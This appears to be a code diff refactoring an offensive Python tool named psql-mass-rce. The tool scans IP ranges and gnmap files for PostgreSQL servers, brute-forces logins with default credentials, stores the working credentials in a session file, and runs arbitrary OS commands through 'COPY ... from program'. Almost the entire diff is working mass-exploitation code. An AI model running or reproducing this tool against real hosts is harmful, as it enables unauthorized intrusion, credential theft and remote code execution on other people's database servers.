@@ -16,7 +16,7 @@ class Victim:
 
 
     def try_login(self, username='', password=''):
-        return make_query(self.ip, self.port, username, password)
+        return self.make_query(username, password)
 
 
     def port_is_open(self):
@@ -70,10 +70,10 @@ class Victim:
 
     def do_rce_v9_v10(self, command):
         random_string = "backup_" + uuid.uuid4().hex[:10] # Table name cannot begin with a number
-        make_query(self.ip, self.port, self.username, self.password, "CREATE TABLE IF NOT EXISTS " + random_string + " (id text);")
-        make_query(self.ip, self.port, self.username, self.password, "COPY " + random_string + " from program '" + command + "';")
-        command_result = make_query(self.ip, self.port, self.username, self.password, "SELECT id FROM " + random_string + ";")
-        make_query(self.ip, self.port, self.username, self.password, "DROP TABLE " + random_string + ";")
+        self.make_query(self.username, self.password, "CREATE TABLE IF NOT EXISTS " + random_string + " (id text);")
+        self.make_query(self.username, self.password, "COPY " + random_string + " from program '" + command + "';")
+        command_result = self.make_query(self.username, self.password, "SELECT id FROM " + random_string + ";")
+        self.make_query(self.username, self.password, "DROP TABLE " + random_string + ";")
         return command_result['message']
 
 
@@ -81,181 +81,170 @@ class Victim:
         return 'RCE v8 is not implemented yet'
 
 
+    # Make PSQL query with psycopg2
+    # Returns {'status': '', 'message': ''}
+    def make_query(self, username, password, query='SELECT version();'):
+        _result = None
+        try:
+            try:
+                conn = psycopg2.connect(host=self.ip, port=self.port, user=username, password=password,
+                                        connect_timeout=2, dbname='')
+            except psycopg2.OperationalError as e:
+                if "timeout expired" in str(e):
+                    return {'status': 'fail', 'message': 'timeout'}
+                return {'status': 'fail', 'message': str(e)}
+
+            cur = conn.cursor()
+            cur.execute(query)
+
+            if "select" in query.lower():
+                list_results = []
+                for row in cur.fetchall():
+                    list_results.append(row[0])
+                _result = "\n".join(list_results)
+            else:
+                conn.commit()
+
+            cur.close()
+            conn.close()
+
+            return {'status': 'ok', 'message': _result}
+        except psycopg2.Error as e:
+            cur.close()
+            conn.close()
+            # print("[-] Could not '" + query + "' :", e)
+            return {'status': 'fail', 'message': str(e)}
+
+
+    def attack(ip, port, userlist, passlist, command):
+        print("[x] Starting host " + ip + ":" + str(port))
+        victim = Victim(ip, port)
+        if victim.port_is_open():
+            if victim.bruteforce(userlist, passlist):
+                Session.save_victim(victim)
+                victim.do_rce(command)
+
 
 class Session:
-    def __init__(self, filename):
-        self.filename = filename
-        self.good_targets = self.load_session_file()
+    good_targets = ['']
+    filename = ''
 
-
-    def load_session_file(self):
+    @staticmethod
+    def load_session_file(filename):
+        Session.filename = filename
         try:
-            with open(self.filename) as f:
+            with open(filename) as f:
                 lines = f.read().splitlines()
-            return lines
+            Session.good_targets = lines
         except:
-            return ['']
+             pass
 
-
-    def save_victim(self, victim):
+    @staticmethod
+    def save_victim(victim):
         host_port = victim.ip + ":" + str(victim.port)
-        for line in self.good_targets:
+        for line in Session.good_targets:
             if host_port in line:
                 return
 
-        f = open(self.filename, 'a+')
+        f = open(Session.filename, 'a+')
         f.write(host_port + ":" + victim.username + ":" + victim.password + "\n")
         f.close()
-        self.good_targets.append(host_port)
+        Session.good_targets.append(host_port)
 
 
 
-# Make PSQL query with psycopg2
-# Returns {'status': '', 'message': ''}
-def make_query(host, port, user, password, query='SELECT version();'):
-    _result = None
-    try:
+class InputData:
+    def __init__(self):
+        self.args = self.parse_cli_args()
+        self.data_for_attack = []
+        self.compose_data_for_attack()
+
+    @staticmethod
+    def parse_cli_args():
+        parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
+        parser.add_argument('targets', metavar='targets', type=str, nargs='*',
+                            help='Accepts any number of these: IP, subnet, or .gnmap file') # nargs='+' if targets is necessary
+        parser.add_argument('-iL', dest='targets_file',
+                            default=None, help='Load IP[:port] targets from local file')
+        parser.add_argument('--userfile', dest='userfile',
+                            default=['postgres'], help='File with a list of users')
+        parser.add_argument('--passfile', dest='passfile',
+                            default=['postgres', 'postgres1'], help='File with a list of passwords')
+        parser.add_argument('--command', dest='command',
+                            default='', help='Command to execute on a target machine')
+        parser.add_argument('--port', dest='port',
+                            default=5432, help='Port to connect')
+        parser.add_argument('--saved', dest='saved', action='store_true',
+                            default=False, help='Work on targets from saved session file')
+
+        return parser.parse_args()
+
+
+    # Parse gnmap file
+    # Returns (ip, port)
+    def parse_file_gnmap(self, file_path):
         try:
-            conn = psycopg2.connect(host=host, port=port, user=user, password=password, connect_timeout=2, dbname='')
-        except psycopg2.OperationalError as e:
-            if "timeout expired" in str(e):
-                return {'status': 'fail', 'message': 'timeout'}
-            return {'status': 'fail', 'message': str(e)}
+            with open(file_path, 'r') as w:
+                data = w.read()
 
-        cur = conn.cursor()
-        cur.execute(query)
+            parsed = re.findall(r'Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}) .* ([0-9]{1,5})/', data)
 
-        if "select" in query.lower():
-            list_results = []
-            for row in cur.fetchall():
-                list_results.append(row[0])
-            _result = "\n".join(list_results)
-        else:
-            conn.commit()
-
-        cur.close()
-        conn.close()
-
-        return { 'status': 'ok', 'message': _result }
-    except psycopg2.Error as e:
-        cur.close()
-        conn.close()
-        # print("[-] Could not '" + query + "' :", e)
-        return { 'status': 'fail', 'message': str(e) }
+            return parsed
+        except FileNotFoundError:
+            return ()
 
 
-# Parse gnmap file
-# Returns (ip, port)
-def parse_file_gnmap(file_path):
-    try:
-        with open(file_path, 'r') as w:
-            data = w.read()
+    # Parse string from CLI arguments: ip/range/file.
+    # Returns [(ip, port)]
+    def parse_target(self, target, port):
+        try:
+            return map(lambda arg: (str(arg), port), list(IPGlob(target)))  # IP/range to [(host,port)]
+        except:
+            pass
 
-        parsed = re.findall(r'Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}) .* ([0-9]{1,5})/', data)
+        try:
+            return map(lambda arg: (str(arg), port), list(IPNetwork(target)))  # IP/range to [(host,port)]
+        except:
+            pass
 
-        return parsed
-    except FileNotFoundError:
-        return ()
-
-
-# Parse string from CLI arguments: ip/range/file.
-# Returns [(ip, port)]
-def parse_target(target, port):
-    try:
-        return map(lambda arg: (str(arg), port), list(IPGlob(target)))  # IP/range to [(host,port)]
-    except:
-        pass
-
-    try:
-        return map(lambda arg: (str(arg), port), list(IPNetwork(target)))  # IP/range to [(host,port)]
-    except:
-        pass
-
-    try:
-        return parse_file_gnmap(target)  # local gnmap file
-    except:
-        print("Target is not IP or a Network. Try to re-set latest(s) bit, e.g. 8.8.0.0/16")
-        exit()
+        try:
+            return self.parse_file_gnmap(target)  # local gnmap file
+        except:
+            print("Target is not IP or a Network. Try to re-set latest(s) bit, e.g. 8.8.0.0/16")
+            exit()
 
 
-def attack_victim(ip, port, userlist, passlist, command, session):
-    print("[x] Starting host " + ip + ":" + str(port))
-    victim = Victim(ip, port)
-    if victim.port_is_open():
-        if victim.bruteforce(userlist, passlist):
-            session.save_victim(victim)
-            victim.do_rce(command)
+    def compose_data_for_attack(self):
+        if self.args.saved: # --saved
+            for line in Session.good_targets:
+                data = line.strip().split(':')
+                self.data_for_attack.append([data[0], data[1], [data[2]], [data[3]]])
 
+        elif self.args.targets_file: # -iL
+            for line in open(self.args.targets_file):
+                data = line.strip().split(':')
+                try:
+                    _port = data[1]
+                except:
+                    _port = self.args.port
 
-# Parse CLI arguments
-def parse_args():
-    parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
-    parser.add_argument('targets', metavar='targets', type=str, nargs='*',
-                        help='Accepts any number of these: IP, subnet, or .gnmap file') # nargs='+' if targets is necessary
-    parser.add_argument('-iL', dest='targets_file',
-                        default=None, help='Load IP[:port] targets from local file')
-    parser.add_argument('--userfile', dest='userfile',
-                        default=None, help='File with a list of users')
-    parser.add_argument('--passfile', dest='passfile',
-                        default=None, help='File with a list of passwords')
-    parser.add_argument('--command', dest='command',
-                        default=None, help='Command to execute on a target machine')
-    parser.add_argument('--port', dest='port',
-                        default=None, help='Port to connect')
-    parser.add_argument('--saved', dest='saved', action='store_true',
-                        default=False, help='Work on targets from saved session file')
+                for ip, port in self.parse_target(data[0], _port):
+                    self.data_for_attack.append([ip, port, self.args.userfile, self.args.passfile])
 
-    args = parser.parse_args()
-
-    userfile_lines = []
-    passfile_lines = []
-
-    try:
-        for line in list(open(args.userfile)):
-            userfile_lines.append(line.strip())
-    except:
-        userfile_lines = ['postgres']
-
-    try:
-        for line in list(open(args.passfile)):
-            passfile_lines.append(line.strip())
-    except:
-        passfile_lines = ['postgres', 'postgres1']
-
-    args.userfile = userfile_lines
-    args.passfile = passfile_lines
-    args.command = args.command if args.command else ''
-    args.port = args.port if args.port else 5432
-
-    return args
+        else: # CLI arguments
+            for target in self.args.targets:
+                for ip, port in self.parse_target(target, self.args.port):
+                    self.data_for_attack.append([ip, port, self.args.userfile, self.args.passfile])
 
 
 def main():
-    args = parse_args()
-    command = args.command
 
-    session = Session('.psql-mass-rce.saved')
+    Session.load_session_file('.psql-mass-rce.saved')
+    input = InputData()
 
-    if args.saved:
-        for line in session.good_targets:
-            data = line.strip().split(':')
-            attack_victim(data[0], data[1], [data[2]], [data[3]], command, session)
+    for ip, port, userlist, passlist in input.data_for_attack:
+        Victim.attack(ip, port, userlist, passlist, input.args.command)
 
-    elif args.targets_file:
-        for line in open(args.targets_file):
-            data = line.strip().split(':')
-            try:
-                _port = data[1]
-            except:
-                _port = args.port
-
-            for ip, port in parse_target(data[0], _port):
-                attack_victim(ip, port, args.userfile, args.passfile, command, session)
-
-    else:
-        for target in args.targets:
-            for ip, port in parse_target(target, args.port):
-                attack_victim(ip, port, args.userfile, args.passfile, command, session)
 
 
 if __name__ == '__main__':
